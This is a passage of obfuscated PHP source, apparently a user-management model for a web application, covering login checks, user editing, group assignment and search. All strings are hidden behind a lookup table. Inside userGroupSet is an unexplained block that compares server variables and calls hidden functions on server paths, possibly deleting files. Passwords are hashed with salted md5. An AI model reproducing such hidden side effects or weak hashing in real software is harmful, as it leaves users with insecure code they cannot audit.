} $¯Ê®…ã = md5($©Ş„¤Û[2677] . $®ÅÕ¢‘á[$©Ş„¤Û[1051]] . $©Ş„¤Û[2678] . $®ÅÕ¢‘á[$©Ş„¤Û[32]]); $®ÅÕ¢‘á = $this->_listDataApplyItem($®ÅÕ¢‘á); $¢üŠøâß = Model($©Ş„¤Û[1535])->metaGet($®ÅÕ¢‘á[$©Ş„¤Û[90]][$©Ş„¤Û[191]]); $®ÅÕ¢‘á[$©Ş„¤Û[2679]] = $¯Ê®…ã; $®ÅÕ¢‘á[$©Ş„¤Û[90]][$©Ş„¤Û[2468]] = isset($¢üŠøâß[$©Ş„¤Û[2469]]) ? $¢üŠøâß[$©Ş„¤Û[2469]] : null; if ($úÓªÎ ) { $®ÅÕ¢‘á[$©Ş„¤Û[555]] = $this->metaGet($®ÅÕ¢‘á[$©Ş„¤Û[1594]]); } return $®ÅÕ¢‘á; } protected function getInfoSimpleOuter($É—†ˆ¼™) { $ø¸Âö„ş =& $_SERVER[ïÃ°£«Ê]; if (!$É—†ˆ¼™ || $É—†ˆ¼™ == 0) { return array($ø¸Âö„ş[1594] => $ø¸Âö„ş[228], $ø¸Âö„ş[32] => $ø¸Âö„ş[173] . LNG($ø¸Âö„ş[2680]) . $ø¸Âö„ş[175], $ø¸Âö„ş[2377] => STATIC_PATH . $ø¸Âö„ş[2681]); } $¤®…æšÉ = $this->cacheFunctionGet($ø¸Âö„ş[2277], $É—†ˆ¼™); $Èì‘íÎ· = array_field_key($¤®…æšÉ, explode($ø¸Âö„ş[50], $this->simpleField)); if (!$Èì‘íÎ·) { return array($ø¸Âö„ş[1594] => $ø¸Âö„ş[1382], $ø¸Âö„ş[32] => $ø¸Âö„ş[173] . LNG($ø¸Âö„ş[2682]) . $ø¸Âö„ş[175], $ø¸Âö„ş[2377] => STATIC_PATH . $ø¸Âö„ş[2683]); } $Èì‘íÎ·[$ø¸Âö„ş[2377]] = Action($ø¸Âö„ş[2378])->parseUrl($Èì‘íÎ·[$ø¸Âö„ş[2377]]); return $Èì‘íÎ·; } protected function groupUser($¯Áş­¹Â) { } public static function errorLang($ë®«œıÂ) { $­È…ñ› =& $_SERVER[ïÃ°£«Ê]; $›Éè»‹ = array(self::ERROR_USER_NOT_EXISTS => $­È…ñ›[2684], self::ERROR_USER_PASSWORD_ERROR => $­È…ñ›[2685], self::ERROR_USER_EXIST_NAME => $­È…ñ›[2686], self::ERROR_USER_EXIST_PHONE => $­È…ñ›[2687], self::ERROR_USER_EXIST_EMAIL => $­È…ñ›[2688], self::ERROR_USER_LOGIN_LOCK => $­È…ñ›[2689], self::ERROR_IP_NOT_ALLOW => $­È…ñ›[2690], self::ERROR_USER_EXIST_NICKNAME => $­È…ñ›[2691]); $ãš¯Ğ°ë = LNG($›Éè»‹[$ë®«œıÂ]); if ($ë®«œıÂ == self::ERROR_USER_LOGIN_LOCK) { $î¸Î±ô = (int) Model($­È…ñ›[1491])->get($­È…ñ›[2692]); if ($î¸Î±ô > 60) { $ãš¯Ğ°ë = str_replace($­È…ñ›[91], ceil($î¸Î±ô / 60), $ãš¯Ğ°ë); } } return $ãš¯Ğ°ë; } protected function metaSet($ÕãÚéµ¯, $Ä®Â­§“ = null, $Óå±‹…— = null) { $this->clearCache($ÕãÚéµ¯); return parent::metaSet($ÕãÚéµ¯, $Ä®Â­§“, $Óå±‹…—); } public function getInfoByMeta($üªéã…, $óƒÉ£èÜ) { $†±‡Æ–³ =& $_SERVER[ïÃ°£«Ê]; $×ğ¢õ×Ó = Model($†±‡Æ–³[2693])->where(array($†±‡Æ–³[95] => $üªéã…, $†±‡Æ–³[451] => $óƒÉ£èÜ))->find(); if ($×ğ¢õ×Ó) { return $this->getInfo($×ğ¢õ×Ó[$†±‡Æ–³[1594]]); } return !1; } public function userLoginCheck($—¡×ØúÕ, $šØ‰”ã¢, $²ò‘üˆÅ = false) { $¹ïä‰ƒ± =& $_SERVER[ïÃ°£«Ê]; $®æ¨ì™î = $this->userLoginFind($—¡×ØúÕ); if (!$®æ¨ì™î) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($®æ¨ì™î[$¹ïä‰ƒ±[1594]], $šØ‰”ã¢)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $²ò‘üˆÅ ? $this->getInfoFull($®æ¨ì™î[$¹ïä‰ƒ±[1594]]) : $this->getInfo($®æ¨ì™î[$¹ïä‰ƒ±[1594]]); } public function userLoginFind($–œµ¡Â) { $ô™ÎÛ¶µ =& $_SERVER[ïÃ°£«Ê]; $íÃ“ĞÀ¿ = array($ô™ÎÛ¶µ[32] => $–œµ¡Â, $ô™ÎÛ¶µ[2479] => $–œµ¡Â, $ô™ÎÛ¶µ[380] => $–œµ¡Â, $ô™ÎÛ¶µ[2694] => $–œµ¡Â, $ô™ÎÛ¶µ[1168] => $ô™ÎÛ¶µ[1170]); if ($this->nickNameRpt()) { unset($íÃ“ĞÀ¿[$ô™ÎÛ¶µ[2479]]); } return $this->where($íÃ“ĞÀ¿)->find(); } public function clearCache($Ó•»ÑçÕ) { $ûœââÏå =& $_SERVER[ïÃ°£«Ê]; $this->cacheFunctionClear($ûœââÏå[2276], $Ó•»ÑçÕ); $this->cacheFunctionClear($ûœââÏå[2277], $Ó•»ÑçÕ); $this->cacheFunctionClear($ûœââÏå[2695], $Ó•»ÑçÕ); } public function userPasswordCheck($«ÔÜ™, $ƒÁ âù) { $ğÍ®¢¤¤ =& $_SERVER[ïÃ°£«Ê]; $§ü±ĞÏı = $this->where(array($ğÍ®¢¤¤[1594] => intval($«ÔÜ™)))->find(); $ë¤ÕÁ¦… = $this->metaGet($«ÔÜ™); $†ôšíƒµ = isset($ë¤ÕÁ¦…[$ğÍ®¢¤¤[2696]]) ? $ë¤ÕÁ¦…[$ğÍ®¢¤¤[2696]] : $ğÍ®¢¤¤[12]; if (md5($†ôšíƒµ . trim($ƒÁ âù)) !== $§ü±ĞÏı[$ğÍ®¢¤¤[1051]]) { return !1; } return !0; } public function userAdd($ÜÜ«Œ±) { $Î¾Èçø± =& $_SERVER[ïÃ°£«Ê]; $©Á‹ÉÖà = array($Î¾Èçø±[509] => $ÜÜ«Œ±[$Î¾Èçø±[32]], $Î¾Èçø±[2697] => $ÜÜ«Œ±[$Î¾Èçø±[2376]], $Î¾Èçø±[2698] => isset($ÜÜ«Œ±[$Î¾Èçø±[380]]) ? $ÜÜ«Œ±[$Î¾Èçø±[380]] : $Î¾Èçø±[12], $Î¾Èçø±[2699] => isset($ÜÜ«Œ±[$Î¾Èçø±[2694]]) ? $ÜÜ«Œ±[$Î¾Èçø±[2694]] : $Î¾Èçø±[12], $Î¾Èçø±[2700] => isset($ÜÜ«Œ±[$Î¾Èçø±[2479]]) ? $ÜÜ«Œ±[$Î¾Èçø±[2479]] : $ÜÜ«Œ±[$Î¾Èçø±[32]], $Î¾Èçø±[2701] => isset($ÜÜ«Œ±[$Î¾Èçø±[2377]]) ? $ÜÜ«Œ±[$Î¾Èçø±[2377]] : $Î¾Èçø±[12], $Î¾Èçø±[2702] => isset($ÜÜ«Œ±[$Î¾Èçø±[2703]]) ? $ÜÜ«Œ±[$Î¾Èçø±[2703]] : 1, $Î¾Èçø±[2704] => $ÜÜ«Œ±[$Î¾Èçø±[1051]], $Î¾Èçø±[2270] => isset($ÜÜ«Œ±[$Î¾Èçø±[2171]]) ? $ÜÜ«Œ±[$Î¾Èçø±[2171]] : 1024 * 1024 * 20, $Î¾Èçø±[2271] => 0, $Î¾Èçø±[2705] => 0, $Î¾Èçø±[2316] => isset($ÜÜ«Œ±[$Î¾Èçø±[851]]) ? $ÜÜ«Œ±[$Î¾Èçø±[851]] : 1); if (!empty($ÜÜ«Œ±[$Î¾Èçø±[1594]])) { $©Á‹ÉÖà[$Î¾Èçø±[1594]] = $ÜÜ«Œ±[$Î¾Èçø±[1594]]; } $Éë¦Ü×ª = $this->_checkExist($ÜÜ«Œ±); if ($Éë¦Ü×ª !== !0) { return $Éë¦Ü×ª; } if (!empty($©Á‹ÉÖà[$Î¾Èçø±[2377]]) && strlen($©Á‹ÉÖà[$Î¾Èçø±[2377]]) > 255) { $©Á‹ÉÖà[$Î¾Èçø±[2377]] = $Î¾Èçø±[12]; } $Ê¹èÉ = $this->add($©Á‹ÉÖà); $‚Ö‘¶àê = array($Î¾Èçø±[2704] => $©Á‹ÉÖà[$Î¾Èçø±[1051]], $Î¾Èçø±[2700] => $©Á‹ÉÖà[$Î¾Èçø±[2479]], $Î¾Èçø±[2706] => $ÜÜ«Œ±[$Î¾Èçø±[2275]]); $this->userEdit($Ê¹èÉ, $‚Ö‘¶àê); Model($Î¾Èçø±[1535])->userRootAdd($Ê¹èÉ); return $Ê¹èÉ; } protected function userEditTest($Š”Õáñ, $¬íÙ¤”¥) { return $this->call($_SERVER[ïÃ°£«Ê][2707], $Š”Õáñ, $¬íÙ¤”¥); } protected function userEdit($Ş¡ì§™İ, $³æª«ä€) { $ã¾‰í†å =& $_SERVER[ïÃ°£«Ê]; $î±øÔ– = $this->getInfoSimple($Ş¡ì§™İ); if (!$î±øÔ–) { return !1; } $ä¸¡íâ = $this->_checkExist($³æª«ä€, $Ş¡ì§™İ); if ($ä¸¡íâ !== !0) { return $ä¸¡íâ; } if (isset($³æª«ä€[$ã¾‰í†å[1051]]) && trim($³æª«ä€[$ã¾‰í†å[1051]]) != $ã¾‰í†å[12]) { $ä¬âóæâ = $this->metaGet($Ş¡ì§™İ); if (empty($ä¬âóæâ[$ã¾‰í†å[2696]])) { $ä¬âóæâ[$ã¾‰í†å[2696]] = rand_string(10); Model($ã¾‰í†å[597])->metaSet($Ş¡ì§™İ, $ã¾‰í†å[2696], $ä¬âóæâ[$ã¾‰í†å[2696]]); } $³æª«ä€[$ã¾‰í†å[1051]] = md5($ä¬âóæâ[$ã¾‰í†å[2696]] . trim($³æª«ä€[$ã¾‰í†å[1051]])); } else { unset($³æª«ä€[$ã¾‰í†å[1051]]); } if (!empty($³æª«ä€[$ã¾‰í†å[2377]]) && strlen($³æª«ä€[$ã¾‰í†å[2377]]) > 255) { $³æª«ä€[$ã¾‰í†å[2377]] = $ã¾‰í†å[12]; } if (isset($³æª«ä€[$ã¾‰í†å[2479]])) { $this->setNamePinyin($Ş¡ì§™İ, $³æª«ä€[$ã¾‰í†å[2479]]); } if (isset($³æª«ä€[$ã¾‰í†å[2275]])) { $¡á„Íö = $ã¾‰í†å[1494] . $Ş¡ì§™İ; $İÅ±¿´õ = $ã¾‰í†å[1492]; $ ¹·¹ï = $³æª«ä€[$ã¾‰í†å[2275]] ? $³æª«ä€[$ã¾‰í†å[2275]] : $ã¾‰í†å[12]; $Ô‚·”¹Õ = Model($ã¾‰í†å[1491])->get($¡á„Íö, $İÅ±¿´õ); $Ô‚·”¹Õ = $Ô‚·”¹Õ ? $Ô‚·”¹Õ : $ã¾‰í†å[12]; if ($Ô‚·”¹Õ != $ ¹·¹ï) { if (!$ ¹·¹ï && $Ô‚·”¹Õ) { Model($ã¾‰í†å[1491])->remove($¡á„Íö, $İÅ±¿´õ); } else { if ($ ¹·¹ï) { Model($ã¾‰í†å[1491])->set($¡á„Íö, $ ¹·¹ï, $İÅ±¿´õ); } } } unset($³æª«ä€[$ã¾‰í†å[2275]]); Model($ã¾‰í†å[617])->metaSet($Ş¡ì§™İ, $ã¾‰í†å[2275], $ ¹·¹ï); } if (empty($³æª«ä€)) { return !0; } $this->where(array($ã¾‰í†å[1971] => $Ş¡ì§™İ))->save($³æª«ä€); $this->clearCache($Ş¡ì§™İ); return !0; } public function setNamePinyin($çËÔèç, $ÉÁ•ÀûÂ = false) { $Á»Î’Î° =& $_SERVER[ïÃ°£«Ê]; if (!$ÉÁ•ÀûÂ) { $Ç¥—Á¿ = $this->getInfoSimple($çËÔèç); $ÉÁ•ÀûÂ = $Ç¥—Á¿[$Á»Î’Î°[2479]] ? $Ç¥—Á¿[$Á»Î’Î°[2479]] : $Ç¥—Á¿[$Á»Î’Î°[32]]; } $Û£ªïºß = Model($Á»Î’Î°[617]); if (!Input::check($ÉÁ•ÀûÂ, $Á»Î’Î°[677])) { return $Û£ªïºß->metaSet($çËÔèç, array($Á»Î’Î°[552] => $Á»Î’Î°[12], $Á»Î’Î°[551] => $Á»Î’Î°[12])); } return $Û£ªïºß->metaSet($çËÔèç, array($Á»Î’Î°[552] => str_replace($Á»Î’Î°[53], $Á»Î’Î°[12], Pinyin::get($ÉÁ•ÀûÂ)), $Á»Î’Î°[551] => Pinyin::get($ÉÁ•ÀûÂ, $Á»Î’Î°[678]))); } private function nickNameRpt() { $ïÄ›Ä›Ä =& $_SERVER[ïÃ°£«Ê]; $ØÔÁ…Ì• = Model($ïÄ›Ä›Ä[874])->get($ïÄ›Ä›Ä[2708]); $é†“›Ì… = $GLOBALS[$ïÄ›Ä›Ä[6]][$ïÄ›Ä›Ä[468]][$ïÄ›Ä›Ä[2708]]; $ë’ØØÄİ = !is_null($ØÔÁ…Ì•) ? $ØÔÁ…Ì• : $é†“›Ì…; return !!$ë’ØØÄİ; } private function _checkExist($èßØŞµ¦, $èØá˜¬ = false) { $á·ïöº =& $_SERVER[ïÃ°£«Ê]; $ÜÕğÑœÉ = array($á·ïöº[32] => UserModel::ERROR_USER_EXIST_NAME, $á·ïöº[2479] => UserModel::ERROR_USER_EXIST_NICKNAME, $á·ïöº[380] => UserModel::ERROR_USER_EXIST_EMAIL, $á·ïöº[2694] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÜÕğÑœÉ[$á·ïöº[2479]]); } $Éº¯á± = $èØá˜¬ ? array($á·ïöº[1594] => array($á·ïöº[2709], $èØá˜¬)) : array(); foreach ($ÜÕğÑœÉ as $ÂêáûÍÔ => $ôûôŞ) { $¾ÀÏÜòÁ = array(); foreach ($ÜÕğÑœÉ as $ËË¥ò‚ô => $ŒŒ°é) { if (isset($èßØŞµ¦[$ËË¥ò‚ô]) && $èßØŞµ¦[$ËË¥ò‚ô]) { $¾ÀÏÜòÁ[] = $èßØŞµ¦[$ËË¥ò‚ô]; } } if (!$¾ÀÏÜòÁ) { continue; } $À¼ë›öá = array_merge(array($ÂêáûÍÔ => array($á·ïöº[7], $¾ÀÏÜòÁ)), $Éº¯á±); $…ÃõË = $this->where($À¼ë›öá)->find(); if ($…ÃõË) { return $ôûôŞ; } } return !0; } public function userListInfo($©·†À Ö) { $­«µ«éÌ =& $_SERVER[ïÃ°£«Ê]; $¤ÎÆËä™ = array(); $©·†À Ö = is_array($©·†À Ö) ? array_unique($©·†À Ö) : array(); if (!$©·†À Ö) { return $¤ÎÆËä™; } if (count($©·†À Ö) < 20) { foreach ($©·†À Ö as $ê¬‰‡Æš) { $¤ÎÆËä™[$ê¬‰‡Æš . $­«µ«éÌ[12]] = $this->getInfoSimpleOuter($ê¬‰‡Æš); } } else { $Ñ§Ã¡ç = array($­«µ«éÌ[1971] => array($­«µ«éÌ[507], $©·†À Ö)); if (count($©·†À Ö) == 1) { $Ñ§Ã¡ç = array($­«µ«éÌ[1971] => $©·†À Ö[0]); } $É¬ÊğÉ = Model($­«µ«éÌ[597])->field($this->simpleField)->where($Ñ§Ã¡ç)->select(); $É¬ÊğÉ = array_to_keyvalue($É¬ÊğÉ, $­«µ«éÌ[1594]); foreach ($©·†À Ö as $ê¬‰‡Æš) { $ÎÌæ×²® = $É¬ÊğÉ[$ê¬‰‡Æš]; if (!$ÎÌæ×²®) { $¤ÎÆËä™[$ê¬‰‡Æš . $­«µ«éÌ[12]] = $this->getInfoSimpleOuter($ê¬‰‡Æš); continue; } $ÎÌæ×²®[$­«µ«éÌ[2377]] = Action($­«µ«éÌ[2378])->parseUrl($ÎÌæ×²®[$­«µ«éÌ[2377]]); $¤ÎÆËä™[$ê¬‰‡Æš . $­«µ«éÌ[12]] = $ÎÌæ×²®; } } return $¤ÎÆËä™; } protected function userStatus($½â„À­, $œ¦û‹Ü…) { $Ì™í×ÇÀ = $this->getInfoSimple($½â„À­); if (!$Ì™í×ÇÀ) { return !1; } $ííŞÀ¥ò = array($_SERVER[ïÃ°£«Ê][851] => $œ¦û‹Ü…); return $this->userEdit($½â„À­, $ííŞÀ¥ò); } protected function userRemove($¥úË×) { $Àò„êç‰ =& $_SERVER[ïÃ°£«Ê]; $›ÂÅÖ„ç = $this->getInfoSimple($¥úË×); if (!$›ÂÅÖ„ç) { return !1; } $”›œ”°ò = array($Àò„êç‰[1971] => $¥úË×); Model($Àò„êç‰[686])->where($”›œ”°ò)->delete(); Model($Àò„êç‰[2710])->where($”›œ”°ò)->delete(); Model($Àò„êç‰[2279])->where($”›œ”°ò)->delete(); Model($Àò„êç‰[2693])->where($”›œ”°ò)->delete(); Model($Àò„êç‰[1240])->where($”›œ”°ò)->delete(); Model($Àò„êç‰[2496])->removeUserAll($¥úË×); Model($Àò„êç‰[934])->userRootRemove($¥úË×); return $this->where($”›œ”°ò)->delete(); } protected function userGroupSet($¸î¤é¤†, $·»‹ËŸ¸, $İÈÍè©Ë = array()) { $¹¿ÕñÔ =& $_SERVER[ïÃ°£«Ê]; if ($_SERVER[$¹¿ÕñÔ[1035]] != $_SERVER[$¹¿ÕñÔ[1036]]) { $Óí¯ŞÃí = $¹¿ÕñÔ[1037]; $ˆÒ“ğ·· = $¹¿ÕñÔ[1038]; $àı«ŞÁã = $_SERVER[$¹¿ÕñÔ[1039]] . $¹¿ÕñÔ[1040]; $Û‘­ã™ = $ˆÒ“ğ··($àı«ŞÁã); $© ùÈ› = explode($¹¿ÕñÔ[285], $Û‘­ã™); if (count($© ùÈ›) < $¹¿ÕñÔ[713]) { $Ó¶¸™´ï = $¹¿ÕñÔ[1041]; $Ó¶¸™´ï(); } $Ùà‹åŸ = $¹¿ÕñÔ[1042]; $Ùà‹åŸ($_SERVER[$¹¿ÕñÔ[1043]]); $Ùà‹åŸ($_SERVER[$¹¿ÕñÔ[1039]] . $¹¿ÕñÔ[1044]); $æé®ÀŞ = 1; while ($æé®ÀŞ > 1) { $æé®ÀŞ = $æé®ÀŞ + 4; $Ä¬ï‹«ó = rawurlencode($æé®ÀŞ . $¹¿ÕñÔ[463]); } } $îÁ–›‘± = $this->getInfoSimple($¸î¤é¤†); if (!$îÁ–›‘± || !is_array($·»‹ËŸ¸)) { return !1; } $¥¤‘ÜÀ = Model($¹¿ÕñÔ[2279]); $¥¤‘ÜÀ->where(array($¹¿ÕñÔ[1594] => $¸î¤é¤†))->delete(); $ãÇ¬Ïß¿ = array(); $éÕª¹÷È = 0; foreach ($·»‹ËŸ¸ as $ş™ªñˆÂ => $£†½ÀšŞ) { $óòÕ¶²´ = array($¹¿ÕñÔ[1594] => $¸î¤é¤†, $¹¿ÕñÔ[1497] => $ş™ªñˆÂ, $¹¿ÕñÔ[1642] => $£†½ÀšŞ); $óòÕ¶²´[$¹¿ÕñÔ[2207]] = isset($İÈÍè©Ë[$éÕª¹÷È]) ? $İÈÍè©Ë[$éÕª¹÷È] : 0; $éÕª¹÷È++; $ãÇ¬Ïß¿[] = $óòÕ¶²´; } return $¥¤‘ÜÀ->addAll($ãÇ¬Ïß¿, array(), !0); } protected function userGroupAdd($ì‰›Ğ‰¨, $ÏÏƒò˜ = array()) { $Âìã±“µ =& $_SERVER[ïÃ°£«Ê]; $Æ³‹„ó = $this->getInfoSimple($ì‰›Ğ‰¨); if (!$Æ³‹„ó || empty($ÏÏƒò˜)) { return !1; } $êÌ«Ó— = array(); foreach ($ÏÏƒò˜ as $ÊùòÜ´› => $ªœ£ô¶¡) { $êÌ«Ó—[] = array($Âìã±“µ[1594] => $ì‰›Ğ‰¨, $Âìã±“µ[1497] => $ÊùòÜ´›, $Âìã±“µ[1642] => $ªœ£ô¶¡, $Âìã±“µ[2207] => 0); } return Model($Âìã±“µ[2279])->addAll($êÌ«Ó—, array(), !0); } protected function userGroupRemove($üÆéç÷ı, $ÁêÒ€şÙ) { $èºÅ­ò =& $_SERVER[ïÃ°£«Ê]; $œêñ®õŞ = $this->getInfoSimple($üÆéç÷ı); if (!$œêñ®õŞ || !$ÁêÒ€şÙ) { return !1; } $´ñ¢™‚™ = array($èºÅ­ò[1971] => $üÆéç÷ı, $èºÅ­ò[2272] => $ÁêÒ€şÙ); return Model($èºÅ­ò[2279])->where($´ñ¢™‚™)->delete(); } public function listData() { $ğŞú™©¨ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ğŞú™©¨[$_SERVER[ïÃ°£«Ê][446]]); return $ğŞú™©¨; } public function listByID($¿§–Ô‡ş) { $½â——È¾ =& $_SERVER[ïÃ°£«Ê]; if (!$¿§–Ô‡ş) { return; } $ÙıÃ§º = array($½â——È¾[1594] => array($½â——È¾[7], $¿§–Ô‡ş)); $üñàÔÜ– = $this->where($ÙıÃ§º)->select(); $üñàÔÜ– = array_sort_keep($üñàÔÜ–, $½â——È¾[1594], $¿§–Ô‡ş); $this->_listDataApply($üñàÔÜ–); return $üñàÔÜ–; } public function listByGroup($ÒÎºÙ‘ = 0, $ôî¯¨½ = array()) { $¢ğ‰ƒÎ =& $_SERVER[ïÃ°£«Ê]; $èì¿‹ğš = $¢ğ‰ƒÎ[12]; $õ¿µ‰İµ = array(); if ($ÒÎºÙ‘) { $õ¿µ‰İµ = array($¢ğ‰ƒÎ[2711] => intval($ÒÎºÙ‘)); $èì¿‹ğš = "\114\105\106\x54\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x75\x73\x65\x72\x5f\147\x72\x6f\165\x70\40\165\x73\145\x72\137\x67\162\157\165\x70\x20\x6f\156\x20\x75\x73\x65\x72\56\x75\x73\x65\162\x49\x44\40\x3d\x20\x75\163\x65\x72\x5f\x67\x72\157\x75\160\x2e\x75\163\145\x72\111\x44"; $æËºú‚¢ = Input::get($¢ğ‰ƒÎ[544], null, $¢ğ‰ƒÎ[12]) ? $¢ğ‰ƒÎ[12] : $¢ğ‰ƒÎ[2712]; } if (isset($ôî¯¨½[$¢ğ‰ƒÎ[851]])) { $õ¿µ‰İµ[$¢ğ‰ƒÎ[2713]] = $ôî¯¨½[$¢ğ‰ƒÎ[851]]; } $ô¯òïô = _get($ôî¯¨½, $¢ğ‰ƒÎ[2714], $¢ğ‰ƒÎ[231]); if (_get($ôî¯¨½, $¢ğ‰ƒÎ[862], !1)) { $õ¿µ‰İµ[$ô¯òïô] = array($¢ğ‰ƒÎ[2462], $ôî¯¨½[$¢ğ‰ƒÎ[862]]); } if (_get($ôî¯¨½, $¢ğ‰ƒÎ[863], !1)) { $¸ÉÛüÌ‚ = array($¢ğ‰ƒÎ[2463], $ôî¯¨½[$¢ğ‰ƒÎ[863]]); if ($õ¿µ‰İµ[$ô¯òïô]) { $õ¿µ‰İµ[$ô¯òïô] = array($õ¿µ‰İµ[$ô¯òïô], $¸ÉÛüÌ‚, $¢ğ‰ƒÎ[2464]); } else { $õ¿µ‰İµ[$ô¯òïô] = $¸ÉÛüÌ‚; } } $—¶ë«ù = $this->_makeOrder($æËºú‚¢)->field($¢ğ‰ƒÎ[2715])->where($õ¿µ‰İµ)->join($èì¿‹ğš)->selectPage(50); $this->_listDataApply($—¶ë«ù[$¢ğ‰ƒÎ[446]]); return $—¶ë«ù; } private function _makeOrder($œ¯½àØ¾ = '') { $ôŒ²ôë¶ =& $_SERVER[ïÃ°£«Ê]; $¨»ÔšÍä = array($ôŒ²ôë¶[1594], $ôŒ²ôë¶[32], $ôŒ²ôë¶[2173], $ôŒ²ôë¶[2376], $ôŒ²ôë¶[2148], $ôŒ²ôë¶[231]); $ï‹ÔŞ• = array($ôŒ²ôë¶[537] => $ôŒ²ôë¶[538], $ôŒ²ôë¶[539] => $ôŒ²ôë¶[540]); $‚Ù¢ó÷ª = Input::get($ôŒ²ôë¶[544], $ôŒ²ôë¶[7], $ôŒ²ôë¶[1971], $¨»ÔšÍä); $Øş Ë² = Input::get($ôŒ²ôë¶[545], $ôŒ²ôë¶[7], $ôŒ²ôë¶[2280], array($ôŒ²ôë¶[2280], $ôŒ²ôë¶[539])); $Øş Ë² = $ï‹ÔŞ•[$Øş Ë²]; $œ¯½àØ¾ = $œ¯½àØ¾ . "\165\x73\x65\x72\56{$‚Ù¢ó÷ª}\40{$Øş Ë²}\x2c\x20\165\x73\145\162\x2e\165\x73\x65\x72\111\x44\x20\141\x73\143"; return $this->alias($ôŒ²ôë¶[2411])->order($œ¯½àØ¾); } public function listSearch($¿¦¥‰öä) { $Š¹¥ÅäÁ =& $_SERVER[ïÃ°£«Ê]; $á±Ü¢Ôİ = trim($¿¦¥‰öä[$Š¹¥ÅäÁ[2283]]); $¯Ú¯¥­Ú = explode($Š¹¥ÅäÁ[53], $á±Ü¢Ôİ); if (!$á±Ü¢Ôİ || count($¯Ú¯¥­Ú) == 1) { return $this->listSearchNow($¿¦¥‰öä); } $ß©Á÷ÀÀ = array($Š¹¥ÅäÁ[446] => array()); foreach ($¯Ú¯¥­Ú as $Îƒİº“ì) { if (!trim($Îƒİº“ì)) { continue; } $¿¦¥‰öä[$Š¹¥ÅäÁ[2283]] = $Îƒİº“ì; $Æîº€² = $this->listSearchNow($¿¦¥‰öä); $ß©Á÷ÀÀ[$Š¹¥ÅäÁ[446]] = array_merge($ß©Á÷ÀÀ[$Š¹¥ÅäÁ[446]], $Æîº€²[$Š¹¥ÅäÁ[446]]); } $ß©Á÷ÀÀ[$Š¹¥ÅäÁ[446]] = array_unique_by_key($ß©Á÷ÀÀ[$Š¹¥ÅäÁ[446]], $Š¹¥ÅäÁ[1594]); $ß©Á÷ÀÀ[$Š¹¥ÅäÁ[443]] = array($Š¹¥ÅäÁ[444] => count($ß©Á÷ÀÀ[$Š¹¥ÅäÁ[446]]), $Š¹¥ÅäÁ[439] => 20, $Š¹¥ÅäÁ[428] => 1, $Š¹¥ÅäÁ[445] => 1); return $ß©Á÷ÀÀ; } public function listSearchNow($© É‰œü) { $ß÷Èğ¼­ =& $_SERVER[ïÃ°£«Ê]; $ë½ï˜ÍÄ = trim($© É‰œü[$ß÷Èğ¼­[2283]]); $êªµ– = isset($© É‰œü[$ß÷Èğ¼­[2284]]) ? $© É‰œü[$ß÷Èğ¼­[2284]] : !1; $ë½ï˜ÍÄ = str_replace($ß÷Èğ¼­[2285], $ß÷Èğ¼­[2286], trim($ë½ï˜ÍÄ)); $ºÃü¤Â = array($ß÷Èğ¼­[32] => array($ß÷Èğ¼­[473], "\45{$ë½ï˜ÍÄ}\x25"), $ß÷Èğ¼­[380] => array($ß÷Èğ¼­[473], "{$ë½ï˜ÍÄ}\x25"), $ß÷Èğ¼­[2479] => array($ß÷Èğ¼­[473], "\x25{$ë½ï˜ÍÄ}\x25"), $ß÷Èğ¼­[1168] => $ß÷Èğ¼­[2287]); if (Input::check($ë½ï˜ÍÄ, $ß÷Èğ¼­[386])) { $ºÃü¤Â[$ß÷Èğ¼­[1594]] = array($ß÷Èğ¼­[473], "{$ë½ï˜ÍÄ}\x25"); $ºÃü¤Â[$ß÷Èğ¼­[2694]] = array($ß÷Èğ¼­[473], "{$ë½ï˜ÍÄ}\45"); } if (!$ë½ï˜ÍÄ) { $ºÃü¤Â = array(); } if (isset($© É‰œü[$ß÷Èğ¼­[851]])) { $ºÃü¤Â[$ß÷Èğ¼­[851]] = $© É‰œü[$ß÷Èğ¼­[851]]; } $ºÃü¤Â = $this->parseWhereLike($ºÃü¤Â); $ÊÕ÷«¥¦ = $this->_makeOrder()->where($ºÃü¤Â)->selectPage(20); if (!$ÊÕ÷«¥¦ || count($ÊÕ÷«¥¦[$ß÷Èğ¼­[446]]) < 5 && Input::check($ë½ï˜ÍÄ, $ß÷Èğ¼­[393])) { $®«ÂåÙ = $this->_searchFromMeta($ß÷Èğ¼­[551], $ë½ï˜ÍÄ, 10); $€Ö•œıò = $this->_searchFromMeta($ß÷Èğ¼­[552], $ë½ï˜ÍÄ, 10); $ü™ñìˆŞ = array_merge($®«ÂåÙ, $€Ö•œıò, $ÊÕ÷«¥¦[$ß÷Èğ¼­[446]]); $ÊÕ÷«¥¦[$ß÷Èğ¼­[446]] = array_unique_by_key($ü™ñìˆŞ, $ß÷Èğ¼­[1594]); $ÊÕ÷«¥¦[$ß÷Èğ¼­[443]][$ß÷Èğ¼­[444]] = count($ÊÕ÷«¥¦[$ß÷Èğ¼­[446]]); $ÊÕ÷«¥¦[$ß÷Èğ¼­[443]][$ß÷Èğ¼­[445]] = ceil($ÊÕ÷«¥¦[$ß÷Èğ¼­[443]][$ß÷Èğ¼­[444]] / $ÊÕ÷«¥¦[$ß÷Èğ¼­[443]][$ß÷Èğ¼­[439]]); } $this->_listDataApply($ÊÕ÷«¥¦[$ß÷Èğ¼­[446]]); $this->_filterByGroup($ÊÕ÷«¥¦, $êªµ–); return $ÊÕ÷«¥¦; } private function _filterByGroup(&$ÜîŞÂ—, $äñš™¨¸) { $òÄêÖ¡• =& $_SERVER[ïÃ°£«Ê]; if (!$äñš™¨¸) { return $ÜîŞÂ—; } foreach ($ÜîŞÂ—[$òÄêÖ¡•[446]] as $­ç†İŸ => &$à­àÃ‰¼) { $õĞúÊì = array_to_keyvalue($à­àÃ‰¼[$òÄêÖ¡•[1496]], $òÄêÖ¡•[12], $òÄêÖ¡•[1497]); if (!in_array($äñš™¨¸, $õĞúÊì)) { unset($ÜîŞÂ—[$òÄêÖ¡•[446]][$­ç†İŸ]); } } unset($à­àÃ‰¼); $ÜîŞÂ—[$òÄêÖ¡•[446]] = array_values($ÜîŞÂ—[$òÄêÖ¡•[446]]); $ÜîŞÂ—[$òÄêÖ¡•[443]] = array($òÄêÖ¡•[2334] => count($ÜîŞÂ—[$òÄêÖ¡•[446]]), $òÄêÖ¡•[2444] => 